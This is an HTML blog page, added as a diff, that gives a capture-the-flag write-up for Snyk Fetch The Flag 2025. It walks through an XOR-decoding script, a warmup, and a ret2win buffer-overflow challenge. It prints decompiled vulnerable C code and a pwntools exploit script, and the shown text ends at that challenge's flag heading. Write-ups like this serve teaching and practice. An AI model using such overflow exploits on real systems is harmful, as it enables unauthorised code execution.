@@ -1,0 +1,723 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="google-site-verification" content="rPvUCgYTOPryg6QXUsRcNaqgw7cfzujZZyi0ipJPLdM" />
+        <meta name="robots" content="noodp" />
+        <title>Snyk Fetch The Flag 2025 Writeup - whyuhurtz&#39;s Blog</title><meta name="Description" content="I managed to solved 5 challenges, which are web exploit, reverse, and pwn."><meta property="og:url" content="http://localhost:1313/2025/10/snyk-fetch-the-flag-2025-writeup/">
+  <meta property="og:site_name" content="whyuhurtz&#39;s Blog">
+  <meta property="og:title" content="Snyk Fetch The Flag 2025 Writeup">
+  <meta property="og:description" content="I managed to solved 5 challenges, which are web exploit, reverse, and pwn.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-10-29T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-10-29T00:00:00+00:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="International">
+    <meta property="article:tag" content="Web Exploit">
+    <meta property="article:tag" content="Reverse">
+    <meta property="article:tag" content="Pwn">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Snyk Fetch The Flag 2025 Writeup">
+  <meta name="twitter:description" content="I managed to solved 5 challenges, which are web exploit, reverse, and pwn.">
+<meta name="application-name" content="whyuhurtz&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="whyuhurtz&#39;s Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/2025/10/snyk-fetch-the-flag-2025-writeup/" /><link rel="prev" href="http://localhost:1313/2025/10/pdf-kmipn-vii-ctf-finals-writeup/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Snyk Fetch The Flag 2025 Writeup",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/2025\/10\/snyk-fetch-the-flag-2025-writeup\/"
+        },"genre": "posts","keywords": "ctf, international, web exploit, reverse, pwn","wordcount":  1763 ,
+        "url": "http:\/\/localhost:1313\/2025\/10\/snyk-fetch-the-flag-2025-writeup\/","datePublished": "2025-10-29T00:00:00+00:00","dateModified": "2025-10-29T00:00:00+00:00","license": "\u0026copy; 2023-2025","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "whyuhurtz"
+            },"description": "I managed to solved 5 challenges, which are web exploit, reverse, and pwn."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/achievements/"> Achievements </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="whyuhurtz&#39;s Blog">whyuhurtz&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/achievements/" title="">Achievements</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Snyk Fetch The Flag 2025 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/whyuhurtz" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>whyuhurtz</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-10-29">2025-10-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1763 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;9 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#warmup">Warmup</a>
+      <ul>
+        <li><a href="#1-zero-ex-six-one---rev">1. Zero Ex Six One - Rev</a>
+          <ul>
+            <li><a href="#description">Description</a></li>
+            <li><a href="#solve-walkthrough">Solve Walkthrough</a></li>
+            <li><a href="#flag">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#2-science-100">2. Science 100</a>
+          <ul>
+            <li><a href="#description-1">Description</a></li>
+            <li><a href="#solve-walkthrough-1">Solve Walkthrough</a></li>
+            <li><a href="#flag-1">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#1-echo">1. Echo</a>
+          <ul>
+            <li><a href="#description-2">Description</a></li>
+            <li><a href="#solve-walkthrough-2">Solve Walkthrough</a></li>
+            <li><a href="#flag-2">Flag</a></li>
+          </ul>
+        </li>
+        <li><a href="#2-additional-information-needed">2. Additional Information Needed</a>
+          <ul>
+            <li><a href="#description-3">Description</a></li>
+            <li><a href="#solve-walkthrough-3">Solve Walkthrough</a></li>
+            <li><a href="#flag-3">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#timeoff">Timeoff</a>
+          <ul>
+            <li><a href="#description-4">Description</a></li>
+            <li><a href="#solve-walkthrough-4">Solve Walkthrough</a></li>
+            <li><a href="#flag-4">Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content">I managed to solved 5 challenges, which are web exploit, reverse, and pwn.
+<h1 id="warmup">Warmup</h1>
+<h2 id="1-zero-ex-six-one---rev">1. Zero Ex Six One - Rev</h2>
+<h3 id="description">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Author: @HuskyHacks</p>
+<p>I&rsquo;m XORta out of ideas for how to get the flag. Does this look like anything to you?</p>
+</div>
+        </div>
+    </div>
+<h3 id="solve-walkthrough">Solve Walkthrough</h3>
+<ul>
+<li>Given <code>flag.txt.encry</code> file and this is the content inside it.</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-txt">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">0x070x0d0x000x060x1a0x020x540x510x050x590x530x020x510x000x530x540x070x520x040x570x550x550x050x510x560x510x530x030x550x500x050x030x050x510x590x540x000x1c</span></span></code></pre></div></div>
+<ul>
+<li>First of all, I ask to GPT, what the heck is this encrypted flag is (coz I&rsquo;m beginner in RE and crypto stuffs).</li>
+<li>Basically, GPT said that <strong>the flag possibly encrypted with XOR cipher</strong>.</li>
+<li>Here&rsquo;s the solver script generated from GPT.</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="p">[</span><span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Data: </span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="se">\\</span><span class="s2">nLength of data: </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x7F</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">  <span class="n">decoded</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">b</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="c1"># Check for printable ASCII value.</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="nb">all</span><span class="p">(</span><span class="mi">32</span> <span class="o">&lt;=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">126</span> <span class="ow">or</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">n&#39;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">decoded</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Key </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">decoded</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<ul>
+<li>So, we&rsquo;ve to put the sequence of bytes into a list of bytes (<em>data</em>).</li>
+<li>Loop from <code>0x20</code> until <code>0x7E</code>, which is all printable ASCII characters in human readable text, such as <em>letters</em>, <em>numbers</em>, and <em>symbols</em>. The <code>0x7F</code> hex value is commonly use for obfuscate the text (<code>DEL</code>). Go to this website to see all list of ASCII tables: &ldquo;<a href="https://byte-tools.com/en/ascii" target="_blank" rel="noopener noreffer ">https://byte-tools.com/en/ascii/</a>&rdquo;.</li>
+<li>Like the name of this challenge, the printable characters is start from XOR-ing the bytes of data with <code>0x61</code> (a).</li>
+<li><code>0x07</code> ^ <code>0x61</code> = <strong>f</strong> ; <code>0x0d</code> ^ <code>0x61</code> = <strong>l</strong> -&gt; can you see the flag pattern ?</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_warmup1-01.png"
+        data-srcset="/images/snyk-ctf_warmup1-01.png, /images/snyk-ctf_warmup1-01.png 1.5x, /images/snyk-ctf_warmup1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_warmup1-01.png"
+        title="Zero Ex Six One-01" width="330" height="121" /></p>
+<ul>
+<li>The if statement inside the for loop is to filtered only readable <strong>decoded text</strong>, which is excluding weird characters such as <code>\\x00</code>, <code>\\xFF</code>, etc.</li>
+<li>After we run the solver script, the output is like this:</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_warmup1-02.png"
+        data-srcset="/images/snyk-ctf_warmup1-02.png, /images/snyk-ctf_warmup1-02.png 1.5x, /images/snyk-ctf_warmup1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_warmup1-02.png"
+        title="Zero Ex Six One-02" width="584" height="365" /></p>
+<ul>
+<li>Notice in key <code>0x61</code> , we got the flag.</li>
+</ul>
+<h3 id="flag">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>flag{c50d82c0a25f3e644d0702b41dbd085a}</strong></div>
+        </div>
+    </div>
+<h2 id="2-science-100">2. Science 100</h2>
+<h3 id="description-1">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Author: @HuskyHacks</p>
+<p>Patrolling the Mojave almost makes you wish for a nuclear winter.</p>
+</div>
+        </div>
+    </div>
+<h3 id="solve-walkthrough-1">Solve Walkthrough</h3>
+<ul>
+<li>Basically, we&rsquo;ve to input all &ldquo;English&rdquo; words in the screen to get access granted.</li>
+<li>If we got the correct one, then we can continue and choose the option number <strong>2</strong>, which is to print the <code>flag.txt</code> file.</li>
+<li>Here&rsquo;s the flag:</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_warmup2-01.png"
+        data-srcset="/images/snyk-ctf_warmup2-01.png, /images/snyk-ctf_warmup2-01.png 1.5x, /images/snyk-ctf_warmup2-01.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_warmup2-01.png"
+        title="Science 100-01" width="668" height="653" /></p>
+<h3 id="flag-1">Flag</h3>
+<div class="details admonition question">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw" aria-hidden="true"></i>Click to show the flag<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><strong>flag{89e575e7272b07a1d33e41e3647b3826}</strong></div>
+        </div>
+    </div>
+<hr>
+<h1 id="pwn">Pwn</h1>
+<h2 id="1-echo">1. Echo</h2>
+<h3 id="description-2">Description</h3>
+<div class="details admonition info">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Click to show the desc<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>Author: @awesome10billion</p>
+<p>I made my own echo program. my own echo program.</p>
+</div>
+        </div>
+    </div>
+<h3 id="solve-walkthrough-2">Solve Walkthrough</h3>
+<ul>
+<li>This is an easy pwn challenge.</li>
+<li>A classic PWN ret2win challenge, we must hijack the control flow to <strong>win</strong> function.</li>
+<li>Check the ELF protection with <code>checksec</code>:</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Arch:       amd64-64-little
+</span></span><span class="line"><span class="cl">RELRO:      No RELRO
+</span></span><span class="line"><span class="cl">Stack:      No canary found
+</span></span><span class="line"><span class="cl">NX:         NX unknown - GNU_STACK missing
+</span></span><span class="line"><span class="cl">PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Stack:      Executable
+</span></span><span class="line"><span class="cl">RWX:        Has RWX segments
+</span></span><span class="line"><span class="cl">SHSTK:      Enabled
+</span></span><span class="line"><span class="cl">IBT:        Enabled
+</span></span><span class="line"><span class="cl">Stripped:   No</span></span></code></pre></div></div>
+<ul>
+<li>Nothing protect us from <strong>ret2win attack</strong>.</li>
+<li>The ELF information is 64-bit and using LE (<em>little endian</em>) format.</li>
+<li>Let&rsquo;s discover list of function symbols inside the ELF binary. I&rsquo;m using Ghidra in this case.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_pwn1-01.png"
+        data-srcset="/images/snyk-ctf_pwn1-01.png, /images/snyk-ctf_pwn1-01.png 1.5x, /images/snyk-ctf_pwn1-01.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_pwn1-01.png"
+        title="Echo-01" width="277" height="258" /></p>
+<ul>
+<li>Here&rsquo;s the decompiled code of <code>main</code> and <code>win</code> functions.</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="n">EVP_PKEY_CTX</span> <span class="o">*</span><span class="n">param_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_88</span> <span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">// 0x80 bytes (HEX).
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  
+</span></span><span class="line"><span class="cl">  <span class="nf">init</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Give me some text and I</span><span class="se">\&#39;</span><span class="s">ll echo it back to you: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">gets</span><span class="p">(</span><span class="n">local_88</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">local_88</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">local_11</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">  <span class="n">__stream</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">__stream</span> <span class="o">!=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_0040126a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Please create </span><span class="se">\&#39;</span><span class="s">flag.txt</span><span class="se">\&#39;</span><span class="s"> in this directory with your own debugging flag.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">FUN_00401120</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">putchar</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">local_11</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nl">LAB_0040126a</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iVar1</span> <span class="o">=</span> <span class="nf">fgetc</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">local_11</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">iVar1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">local_11</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">fclose</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<ul>
+<li>Simply, we&rsquo;ve to hijack control flow with <strong>ret2win attack</strong>, so we can start executing <code>win</code> function after <code>ret</code> main.</li>
+<li>Here&rsquo;s my exploit script for this challenge.</li>
+</ul>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#filename: exploit.py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./echo&#34;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;debug&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Prepare the payload.</span>
+</span></span><span class="line"><span class="cl"><span class="n">win_addr</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;win&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x80</span> <span class="c1"># --------------&lt; Buff size.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0x8</span> <span class="c1"># --------------&lt; Old RBP.</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">win_addr</span> <span class="c1"># --------------&lt; Jump to win_addr.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send the payload.</span>
+</span></span><span class="line"><span class="cl"><span class="n">is_remote</span> <span class="o">=</span> <span class="kc">False</span> <span class="c1"># change to True if you want to run remotely.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">is_remote</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;challenge.ctf.games&#34;</span><span class="p">,</span> <span class="mi">31084</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">io</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
+<ul>
+<li>Create a sample <code>flag.txt</code> file to run the exploit script locally. If it success, then we can run the exploit script remotely. Just change the <code>is_remote</code> variable to <code>True</code>.</li>
+<li>And we got the flag.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/snyk-ctf_pwn1-02.png"
+        data-srcset="/images/snyk-ctf_pwn1-02.png, /images/snyk-ctf_pwn1-02.png 1.5x, /images/snyk-ctf_pwn1-02.png 2x"
+        data-sizes="auto"
+        alt="/images/snyk-ctf_pwn1-02.png"
+        title="Echo-02" width="951" height="748" /></p>
+<h3 id="flag-2">Flag</h3>
